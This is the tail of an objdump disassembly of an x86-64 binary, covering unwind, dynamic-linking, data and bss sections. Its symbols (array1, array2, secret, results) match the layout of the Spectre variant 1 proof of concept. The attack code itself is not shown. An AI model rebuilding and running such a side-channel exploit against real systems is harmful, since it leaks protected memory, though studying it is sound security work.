 f48:	d8 00                	fadd   DWORD PTR [rax]
 f4a:	00 00                	add    BYTE PTR [rax],al
 f4c:	a7                   	cmps   DWORD PTR ds:[rsi],DWORD PTR es:[rdi]
 f4d:	f8                   	clc    
 f4e:	ff                   	(bad)  
 f4f:	ff                   	(bad)  
 f50:	f8                   	clc    
 f51:	00 00                	add    BYTE PTR [rax],al
 f53:	00 c0                	add    al,al
 f55:	fc                   	cld    
 f56:	ff                   	(bad)  
 f57:	ff 1c 01             	call   FWORD PTR [rcx+rax*1]
 f5a:	00 00                	add    BYTE PTR [rax],al
 f5c:	b0 fe                	mov    al,0xfe
 f5e:	ff                   	(bad)  
 f5f:	ff 40 01             	inc    DWORD PTR [rax+0x1]
 f62:	00 00                	add    BYTE PTR [rax],al
 f64:	20 ff                	and    bh,bh
 f66:	ff                   	(bad)  
 f67:	ff                   	.byte 0xff
 f68:	88 01                	mov    BYTE PTR [rcx],al
	...

Disassembly of section .eh_frame:

0000000000000f70 <__FRAME_END__-0x14c>:
     f70:	14 00                	adc    al,0x0
     f72:	00 00                	add    BYTE PTR [rax],al
     f74:	00 00                	add    BYTE PTR [rax],al
     f76:	00 00                	add    BYTE PTR [rax],al
     f78:	01 7a 52             	add    DWORD PTR [rdx+0x52],edi
     f7b:	00 01                	add    BYTE PTR [rcx],al
     f7d:	78 10                	js     f8f <__GNU_EH_FRAME_HDR+0x6f>
     f7f:	01 1b                	add    DWORD PTR [rbx],ebx
     f81:	0c 07                	or     al,0x7
     f83:	08 90 01 07 10 14    	or     BYTE PTR [rax+0x14100701],dl
     f89:	00 00                	add    BYTE PTR [rax],al
     f8b:	00 1c 00             	add    BYTE PTR [rax+rax*1],bl
     f8e:	00 00                	add    BYTE PTR [rax],al
     f90:	e0 f6                	loopne f88 <__GNU_EH_FRAME_HDR+0x68>
     f92:	ff                   	(bad)  
     f93:	ff 2b                	jmp    FWORD PTR [rbx]
	...
     f9d:	00 00                	add    BYTE PTR [rax],al
     f9f:	00 14 00             	add    BYTE PTR [rax+rax*1],dl
     fa2:	00 00                	add    BYTE PTR [rax],al
     fa4:	00 00                	add    BYTE PTR [rax],al
     fa6:	00 00                	add    BYTE PTR [rax],al
     fa8:	01 7a 52             	add    DWORD PTR [rdx+0x52],edi
     fab:	00 01                	add    BYTE PTR [rcx],al
     fad:	78 10                	js     fbf <__GNU_EH_FRAME_HDR+0x9f>
     faf:	01 1b                	add    DWORD PTR [rbx],ebx
     fb1:	0c 07                	or     al,0x7
     fb3:	08 90 01 00 00 24    	or     BYTE PTR [rax+0x24000001],dl
     fb9:	00 00                	add    BYTE PTR [rax],al
     fbb:	00 1c 00             	add    BYTE PTR [rax+rax*1],bl
     fbe:	00 00                	add    BYTE PTR [rax],al
     fc0:	50                   	push   rax
     fc1:	f6 ff                	idiv   bh
     fc3:	ff 50 00             	call   QWORD PTR [rax+0x0]
     fc6:	00 00                	add    BYTE PTR [rax],al
     fc8:	00 0e                	add    BYTE PTR [rsi],cl
     fca:	10 46 0e             	adc    BYTE PTR [rsi+0xe],al
     fcd:	18 4a 0f             	sbb    BYTE PTR [rdx+0xf],cl
     fd0:	0b 77 08             	or     esi,DWORD PTR [rdi+0x8]
     fd3:	80 00 3f             	add    BYTE PTR [rax],0x3f
     fd6:	1a 3b                	sbb    bh,BYTE PTR [rbx]
     fd8:	2a 33                	sub    dh,BYTE PTR [rbx]
     fda:	24 22                	and    al,0x22
     fdc:	00 00                	add    BYTE PTR [rax],al
     fde:	00 00                	add    BYTE PTR [rax],al
     fe0:	14 00                	adc    al,0x0
     fe2:	00 00                	add    BYTE PTR [rax],al
     fe4:	44 00 00             	add    BYTE PTR [rax],r8b
     fe7:	00 78 f6             	add    BYTE PTR [rax-0xa],bh
     fea:	ff                   	(bad)  
     feb:	ff 08                	dec    DWORD PTR [rax]
	...
     ff5:	00 00                	add    BYTE PTR [rax],al
     ff7:	00 1c 00             	add    BYTE PTR [rax+rax*1],bl
     ffa:	00 00                	add    BYTE PTR [rax],al
     ffc:	5c                   	pop    rsp
     ffd:	00 00                	add    BYTE PTR [rax],al
     fff:	00 7a f7             	add    BYTE PTR [rdx-0x9],bh
    1002:	ff                   	(bad)  
    1003:	ff 4d 00             	dec    DWORD PTR [rbp+0x0]
    1006:	00 00                	add    BYTE PTR [rax],al
    1008:	00 41 0e             	add    BYTE PTR [rcx+0xe],al
    100b:	10 86 02 43 0d 06    	adc    BYTE PTR [rsi+0x60d4302],al
    1011:	02 48 0c             	add    cl,BYTE PTR [rax+0xc]
    1014:	07                   	(bad)  
    1015:	08 00                	or     BYTE PTR [rax],al
    1017:	00 20                	add    BYTE PTR [rax],ah
    1019:	00 00                	add    BYTE PTR [rax],al
    101b:	00 7c 00 00          	add    BYTE PTR [rax+rax*1+0x0],bh
    101f:	00 a7 f7 ff ff 19    	add    BYTE PTR [rdi+0x19fffff7],ah
    1025:	04 00                	add    al,0x0
    1027:	00 00                	add    BYTE PTR [rax],al
    1029:	41 0e                	rex.B (bad) 
    102b:	10 86 02 43 0d 06    	adc    BYTE PTR [rsi+0x60d4302],al
    1031:	48 83 03 03          	add    QWORD PTR [rbx],0x3
    1035:	0c 04                	or     al,0x4
    1037:	0c 07                	or     al,0x7
    1039:	08 00                	or     BYTE PTR [rax],al
    103b:	00 20                	add    BYTE PTR [rax],ah
    103d:	00 00                	add    BYTE PTR [rax],al
    103f:	00 a0 00 00 00 9c    	add    BYTE PTR [rax-0x64000000],ah
    1045:	fb                   	sti    
    1046:	ff                   	(bad)  
    1047:	ff                   	(bad)  
    1048:	e8 01 00 00 00       	call   104e <__GNU_EH_FRAME_HDR+0x12e>
    104d:	41 0e                	rex.B (bad) 
    104f:	10 86 02 43 0d 06    	adc    BYTE PTR [rsi+0x60d4302],al
    1055:	03 e3                	add    esp,ebx
    1057:	01 0c 07             	add    DWORD PTR [rdi+rax*1],ecx
    105a:	08 00                	or     BYTE PTR [rax],al
    105c:	00 00                	add    BYTE PTR [rax],al
    105e:	00 00                	add    BYTE PTR [rax],al
    1060:	44 00 00             	add    BYTE PTR [rax],r8b
    1063:	00 c4                	add    ah,al
    1065:	00 00                	add    BYTE PTR [rax],al
    1067:	00 68 fd             	add    BYTE PTR [rax-0x3],ch
    106a:	ff                   	(bad)  
    106b:	ff 65 00             	jmp    QWORD PTR [rbp+0x0]
    106e:	00 00                	add    BYTE PTR [rax],al
    1070:	00 42 0e             	add    BYTE PTR [rdx+0xe],al
    1073:	10 8f 02 42 0e 18    	adc    BYTE PTR [rdi+0x180e4202],cl
    1079:	8e 03                	mov    es,WORD PTR [rbx]
    107b:	45 0e                	rex.RB (bad) 
    107d:	20 8d 04 42 0e 28    	and    BYTE PTR [rbp+0x280e4204],cl
    1083:	8c 05 48 0e 30 86    	mov    WORD PTR [rip+0xffffffff86300e48],es        # ffffffff86301ed1 <_end+0xffffffff860df911>
    1089:	06                   	(bad)  
    108a:	48 0e                	rex.W (bad) 
    108c:	38 83 07 4d 0e 40    	cmp    BYTE PTR [rbx+0x400e4d07],al
    1092:	72 0e                	jb     10a2 <__GNU_EH_FRAME_HDR+0x182>
    1094:	38 41 0e             	cmp    BYTE PTR [rcx+0xe],al
    1097:	30 41 0e             	xor    BYTE PTR [rcx+0xe],al
    109a:	28 42 0e             	sub    BYTE PTR [rdx+0xe],al
    109d:	20 42 0e             	and    BYTE PTR [rdx+0xe],al
    10a0:	18 42 0e             	sbb    BYTE PTR [rdx+0xe],al
    10a3:	10 42 0e             	adc    BYTE PTR [rdx+0xe],al
    10a6:	08 00                	or     BYTE PTR [rax],al
    10a8:	10 00                	adc    BYTE PTR [rax],al
    10aa:	00 00                	add    BYTE PTR [rax],al
    10ac:	0c 01                	or     al,0x1
    10ae:	00 00                	add    BYTE PTR [rax],al
    10b0:	90                   	nop
    10b1:	fd                   	std    
    10b2:	ff                   	(bad)  
    10b3:	ff 02                	inc    DWORD PTR [rdx]
    10b5:	00 00                	add    BYTE PTR [rax],al
    10b7:	00 00                	add    BYTE PTR [rax],al
    10b9:	00 00                	add    BYTE PTR [rax],al
	...

00000000000010bc <__FRAME_END__>:
    10bc:	00 00                	add    BYTE PTR [rax],al
	...

Disassembly of section .init_array:

0000000000201da0 <__frame_dummy_init_array_entry>:
  201da0:	70 07                	jo     201da9 <__init_array_end+0x1>
  201da2:	00 00                	add    BYTE PTR [rax],al
  201da4:	00 00                	add    BYTE PTR [rax],al
	...

Disassembly of section .fini_array:

0000000000201da8 <__do_global_dtors_aux_fini_array_entry>:
  201da8:	30 07                	xor    BYTE PTR [rdi],al
  201daa:	00 00                	add    BYTE PTR [rax],al
  201dac:	00 00                	add    BYTE PTR [rax],al
	...

Disassembly of section .dynamic:

0000000000201db0 <_DYNAMIC>:
  201db0:	01 00                	add    DWORD PTR [rax],eax
  201db2:	00 00                	add    BYTE PTR [rax],al
  201db4:	00 00                	add    BYTE PTR [rax],al
  201db6:	00 00                	add    BYTE PTR [rax],al
  201db8:	01 00                	add    DWORD PTR [rax],eax
  201dba:	00 00                	add    BYTE PTR [rax],al
  201dbc:	00 00                	add    BYTE PTR [rax],al
  201dbe:	00 00                	add    BYTE PTR [rax],al
  201dc0:	0c 00                	or     al,0x0
  201dc2:	00 00                	add    BYTE PTR [rax],al
  201dc4:	00 00                	add    BYTE PTR [rax],al
  201dc6:	00 00                	add    BYTE PTR [rax],al
  201dc8:	f8                   	clc    
  201dc9:	05 00 00 00 00       	add    eax,0x0
  201dce:	00 00                	add    BYTE PTR [rax],al
  201dd0:	0d 00 00 00 00       	or     eax,0x0
  201dd5:	00 00                	add    BYTE PTR [rax],al
  201dd7:	00 44 0e 00          	add    BYTE PTR [rsi+rcx*1+0x0],al
  201ddb:	00 00                	add    BYTE PTR [rax],al
  201ddd:	00 00                	add    BYTE PTR [rax],al
  201ddf:	00 19                	add    BYTE PTR [rcx],bl
  201de1:	00 00                	add    BYTE PTR [rax],al
  201de3:	00 00                	add    BYTE PTR [rax],al
  201de5:	00 00                	add    BYTE PTR [rax],al
  201de7:	00 a0 1d 20 00 00    	add    BYTE PTR [rax+0x201d],ah
  201ded:	00 00                	add    BYTE PTR [rax],al
  201def:	00 1b                	add    BYTE PTR [rbx],bl
  201df1:	00 00                	add    BYTE PTR [rax],al
  201df3:	00 00                	add    BYTE PTR [rax],al
  201df5:	00 00                	add    BYTE PTR [rax],al
  201df7:	00 08                	add    BYTE PTR [rax],cl
  201df9:	00 00                	add    BYTE PTR [rax],al
  201dfb:	00 00                	add    BYTE PTR [rax],al
  201dfd:	00 00                	add    BYTE PTR [rax],al
  201dff:	00 1a                	add    BYTE PTR [rdx],bl
  201e01:	00 00                	add    BYTE PTR [rax],al
  201e03:	00 00                	add    BYTE PTR [rax],al
  201e05:	00 00                	add    BYTE PTR [rax],al
  201e07:	00 a8 1d 20 00 00    	add    BYTE PTR [rax+0x201d],ch
  201e0d:	00 00                	add    BYTE PTR [rax],al
  201e0f:	00 1c 00             	add    BYTE PTR [rax+rax*1],bl
  201e12:	00 00                	add    BYTE PTR [rax],al
  201e14:	00 00                	add    BYTE PTR [rax],al
  201e16:	00 00                	add    BYTE PTR [rax],al
  201e18:	08 00                	or     BYTE PTR [rax],al
  201e1a:	00 00                	add    BYTE PTR [rax],al
  201e1c:	00 00                	add    BYTE PTR [rax],al
  201e1e:	00 00                	add    BYTE PTR [rax],al
  201e20:	f5                   	cmc    
  201e21:	fe                   	(bad)  
  201e22:	ff 6f 00             	jmp    FWORD PTR [rdi+0x0]
  201e25:	00 00                	add    BYTE PTR [rax],al
  201e27:	00 98 02 00 00 00    	add    BYTE PTR [rax+0x2],bl
  201e2d:	00 00                	add    BYTE PTR [rax],al
  201e2f:	00 05 00 00 00 00    	add    BYTE PTR [rip+0x0],al        # 201e35 <_DYNAMIC+0x85>
  201e35:	00 00                	add    BYTE PTR [rax],al
  201e37:	00 a8 03 00 00 00    	add    BYTE PTR [rax+0x3],ch
  201e3d:	00 00                	add    BYTE PTR [rax],al
  201e3f:	00 06                	add    BYTE PTR [rsi],al
  201e41:	00 00                	add    BYTE PTR [rax],al
  201e43:	00 00                	add    BYTE PTR [rax],al
  201e45:	00 00                	add    BYTE PTR [rax],al
  201e47:	00 b8 02 00 00 00    	add    BYTE PTR [rax+0x2],bh
  201e4d:	00 00                	add    BYTE PTR [rax],al
  201e4f:	00 0a                	add    BYTE PTR [rdx],cl
  201e51:	00 00                	add    BYTE PTR [rax],al
  201e53:	00 00                	add    BYTE PTR [rax],al
  201e55:	00 00                	add    BYTE PTR [rax],al
  201e57:	00 c1                	add    cl,al
  201e59:	00 00                	add    BYTE PTR [rax],al
  201e5b:	00 00                	add    BYTE PTR [rax],al
  201e5d:	00 00                	add    BYTE PTR [rax],al
  201e5f:	00 0b                	add    BYTE PTR [rbx],cl
  201e61:	00 00                	add    BYTE PTR [rax],al
  201e63:	00 00                	add    BYTE PTR [rax],al
  201e65:	00 00                	add    BYTE PTR [rax],al
  201e67:	00 18                	add    BYTE PTR [rax],bl
  201e69:	00 00                	add    BYTE PTR [rax],al
  201e6b:	00 00                	add    BYTE PTR [rax],al
  201e6d:	00 00                	add    BYTE PTR [rax],al
  201e6f:	00 15 00 00 00 00    	add    BYTE PTR [rip+0x0],dl        # 201e75 <_DYNAMIC+0xc5>
	...
  201e7d:	00 00                	add    BYTE PTR [rax],al
  201e7f:	00 03                	add    BYTE PTR [rbx],al
  201e81:	00 00                	add    BYTE PTR [rax],al
  201e83:	00 00                	add    BYTE PTR [rax],al
  201e85:	00 00                	add    BYTE PTR [rax],al
  201e87:	00 a0 1f 20 00 00    	add    BYTE PTR [rax+0x201f],ah
  201e8d:	00 00                	add    BYTE PTR [rax],al
  201e8f:	00 02                	add    BYTE PTR [rdx],al
  201e91:	00 00                	add    BYTE PTR [rax],al
  201e93:	00 00                	add    BYTE PTR [rax],al
  201e95:	00 00                	add    BYTE PTR [rax],al
  201e97:	00 60 00             	add    BYTE PTR [rax+0x0],ah
  201e9a:	00 00                	add    BYTE PTR [rax],al
  201e9c:	00 00                	add    BYTE PTR [rax],al
  201e9e:	00 00                	add    BYTE PTR [rax],al
  201ea0:	14 00                	adc    al,0x0
  201ea2:	00 00                	add    BYTE PTR [rax],al
  201ea4:	00 00                	add    BYTE PTR [rax],al
  201ea6:	00 00                	add    BYTE PTR [rax],al
  201ea8:	07                   	(bad)  
  201ea9:	00 00                	add    BYTE PTR [rax],al
  201eab:	00 00                	add    BYTE PTR [rax],al
  201ead:	00 00                	add    BYTE PTR [rax],al
  201eaf:	00 17                	add    BYTE PTR [rdi],dl
  201eb1:	00 00                	add    BYTE PTR [rax],al
  201eb3:	00 00                	add    BYTE PTR [rax],al
  201eb5:	00 00                	add    BYTE PTR [rax],al
  201eb7:	00 98 05 00 00 00    	add    BYTE PTR [rax+0x5],bl
  201ebd:	00 00                	add    BYTE PTR [rax],al
  201ebf:	00 07                	add    BYTE PTR [rdi],al
  201ec1:	00 00                	add    BYTE PTR [rax],al
  201ec3:	00 00                	add    BYTE PTR [rax],al
  201ec5:	00 00                	add    BYTE PTR [rax],al
  201ec7:	00 c0                	add    al,al
  201ec9:	04 00                	add    al,0x0
  201ecb:	00 00                	add    BYTE PTR [rax],al
  201ecd:	00 00                	add    BYTE PTR [rax],al
  201ecf:	00 08                	add    BYTE PTR [rax],cl
  201ed1:	00 00                	add    BYTE PTR [rax],al
  201ed3:	00 00                	add    BYTE PTR [rax],al
  201ed5:	00 00                	add    BYTE PTR [rax],al
  201ed7:	00 d8                	add    al,bl
  201ed9:	00 00                	add    BYTE PTR [rax],al
  201edb:	00 00                	add    BYTE PTR [rax],al
  201edd:	00 00                	add    BYTE PTR [rax],al
  201edf:	00 09                	add    BYTE PTR [rcx],cl
  201ee1:	00 00                	add    BYTE PTR [rax],al
  201ee3:	00 00                	add    BYTE PTR [rax],al
  201ee5:	00 00                	add    BYTE PTR [rax],al
  201ee7:	00 18                	add    BYTE PTR [rax],bl
  201ee9:	00 00                	add    BYTE PTR [rax],al
  201eeb:	00 00                	add    BYTE PTR [rax],al
  201eed:	00 00                	add    BYTE PTR [rax],al
  201eef:	00 1e                	add    BYTE PTR [rsi],bl
  201ef1:	00 00                	add    BYTE PTR [rax],al
  201ef3:	00 00                	add    BYTE PTR [rax],al
  201ef5:	00 00                	add    BYTE PTR [rax],al
  201ef7:	00 08                	add    BYTE PTR [rax],cl
  201ef9:	00 00                	add    BYTE PTR [rax],al
  201efb:	00 00                	add    BYTE PTR [rax],al
  201efd:	00 00                	add    BYTE PTR [rax],al
  201eff:	00 fb                	add    bl,bh
  201f01:	ff                   	(bad)  
  201f02:	ff 6f 00             	jmp    FWORD PTR [rdi+0x0]
  201f05:	00 00                	add    BYTE PTR [rax],al
  201f07:	00 01                	add    BYTE PTR [rcx],al
  201f09:	00 00                	add    BYTE PTR [rax],al
  201f0b:	08 00                	or     BYTE PTR [rax],al
  201f0d:	00 00                	add    BYTE PTR [rax],al
  201f0f:	00 fe                	add    dh,bh
  201f11:	ff                   	(bad)  
  201f12:	ff 6f 00             	jmp    FWORD PTR [rdi+0x0]
  201f15:	00 00                	add    BYTE PTR [rax],al
  201f17:	00 80 04 00 00 00    	add    BYTE PTR [rax+0x4],al
  201f1d:	00 00                	add    BYTE PTR [rax],al
  201f1f:	00 ff                	add    bh,bh
  201f21:	ff                   	(bad)  
  201f22:	ff 6f 00             	jmp    FWORD PTR [rdi+0x0]
  201f25:	00 00                	add    BYTE PTR [rax],al
  201f27:	00 01                	add    BYTE PTR [rcx],al
  201f29:	00 00                	add    BYTE PTR [rax],al
  201f2b:	00 00                	add    BYTE PTR [rax],al
  201f2d:	00 00                	add    BYTE PTR [rax],al
  201f2f:	00 f0                	add    al,dh
  201f31:	ff                   	(bad)  
  201f32:	ff 6f 00             	jmp    FWORD PTR [rdi+0x0]
  201f35:	00 00                	add    BYTE PTR [rax],al
  201f37:	00 6a 04             	add    BYTE PTR [rdx+0x4],ch
  201f3a:	00 00                	add    BYTE PTR [rax],al
  201f3c:	00 00                	add    BYTE PTR [rax],al
  201f3e:	00 00                	add    BYTE PTR [rax],al
  201f40:	f9                   	stc    
  201f41:	ff                   	(bad)  
  201f42:	ff 6f 00             	jmp    FWORD PTR [rdi+0x0]
  201f45:	00 00                	add    BYTE PTR [rax],al
  201f47:	00 04 00             	add    BYTE PTR [rax+rax*1],al
	...

Disassembly of section .got:

0000000000201fa0 <_GLOBAL_OFFSET_TABLE_>:
  201fa0:	b0 1d                	mov    al,0x1d
  201fa2:	20 00                	and    BYTE PTR [rax],al
	...
  201fb8:	26 06                	es (bad) 
  201fba:	00 00                	add    BYTE PTR [rax],al
  201fbc:	00 00                	add    BYTE PTR [rax],al
  201fbe:	00 00                	add    BYTE PTR [rax],al
  201fc0:	36 06                	ss (bad) 
  201fc2:	00 00                	add    BYTE PTR [rax],al
  201fc4:	00 00                	add    BYTE PTR [rax],al
  201fc6:	00 00                	add    BYTE PTR [rax],al
  201fc8:	46 06                	rex.RX (bad) 
  201fca:	00 00                	add    BYTE PTR [rax],al
  201fcc:	00 00                	add    BYTE PTR [rax],al
  201fce:	00 00                	add    BYTE PTR [rax],al
  201fd0:	56                   	push   rsi
  201fd1:	06                   	(bad)  
	...

Disassembly of section .data:

0000000000202000 <__data_start>:
	...

0000000000202008 <__dso_handle>:
  202008:	08 20                	or     BYTE PTR [rax],ah
  20200a:	20 00                	and    BYTE PTR [rax],al
	...

0000000000202020 <array1_size>:
  202020:	10 00                	adc    BYTE PTR [rax],al
	...

0000000000202040 <array1>:
  202040:	01 02                	add    DWORD PTR [rdx],eax
  202042:	03 04 05 06 07 08 09 	add    eax,DWORD PTR [rax*1+0x9080706]
  202049:	0a 0b                	or     cl,BYTE PTR [rbx]
  20204b:	0c 0d                	or     al,0xd
  20204d:	0e                   	(bad)  
  20204e:	0f 10 00             	movups xmm0,XMMWORD PTR [rax]
	...

00000000002020e0 <secret>:
  2020e0:	58                   	pop    rax
  2020e1:	0e                   	(bad)  
  2020e2:	00 00                	add    BYTE PTR [rax],al
  2020e4:	00 00                	add    BYTE PTR [rax],al
	...

Disassembly of section .bss:

0000000000202100 <completed.7698>:
	...

0000000000202120 <array2>:
	...

0000000000222120 <temp>:
	...

0000000000222140 <results.23458>:
	...

0000000000222540 <unused1>:
	...

0000000000222580 <unused2>:
	...

Disassembly of section .comment:

0000000000000000 <.comment>:
   0:	47                   	rex.RXB
   1:	43                   	rex.XB
   2:	43 3a 20             	rex.XB cmp spl,BYTE PTR [r8]
   5:	28 55 62             	sub    BYTE PTR [rbp+0x62],dl
   8:	75 6e                	jne    78 <_init-0x580>
   a:	74 75                	je     81 <_init-0x577>
   c:	20 37                	and    BYTE PTR [rdi],dh
   e:	2e 35 2e 30 2d 33    	cs xor eax,0x332d302e
  14:	75 62                	jne    78 <_init-0x580>
  16:	75 6e                	jne    86 <_init-0x572>
  18:	74 75                	je     8f <_init-0x569>
  1a:	31 7e 31             	xor    DWORD PTR [rsi+0x31],edi
  1d:	38 2e                	cmp    BYTE PTR [rsi],ch
  1f:	30 34 29             	xor    BYTE PTR [rcx+rbp*1],dh
  22:	20 37                	and    BYTE PTR [rdi],dh
  24:	2e                   	cs
  25:	35                   	.byte 0x35
  26:	2e 30 00             	xor    BYTE PTR cs:[rax],al
